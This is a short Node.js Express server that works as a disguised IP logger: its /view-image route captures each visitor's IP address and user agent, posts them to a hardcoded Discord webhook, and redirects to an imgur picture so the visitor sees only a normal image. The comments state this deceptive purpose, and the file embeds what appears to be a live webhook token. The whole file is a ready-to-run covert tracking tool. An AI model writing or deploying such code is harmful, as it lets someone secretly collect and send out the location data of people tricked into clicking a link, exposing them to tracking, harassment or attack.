const express = require('express');
const fetch = require('node-fetch');
const app = express();

const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1545911067870371892/Gx5KU36Het0H_4KjrClvL1wUiMb2nXbDmRg0zYXcJr-_uCa2bDlptGJVTjLLesGgqXj2';

// Enable proxy headers so cloud hosts forward the actual visitor IP
app.set('trust proxy', true);

app.get('/view-image', async (req, res) => {
    // Extract the visitor's real IP address
    const userIp = req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Unknown Device';

    // 1. Send the log straight to your Discord channel
    try {
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: "🚨 New Link Triggered!",
                    color: 15158332,
                    fields: [
                        { name: "IP Address", value: `\`${userIp}\``, inline: true },
                        { name: "User Agent", value: userAgent, inline: false }
                    ],
                    timestamp: new Date().toISOString()
                }]
            })
        });
    } catch (err) {
        console.error("Failed to send webhook:", err);
    }

    // 2. Redirect the user to a real image so they see a normal picture
    res.redirect('https://i.imgur.com/8N4X1aD.jpg');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Tracker server active on port ${PORT}`));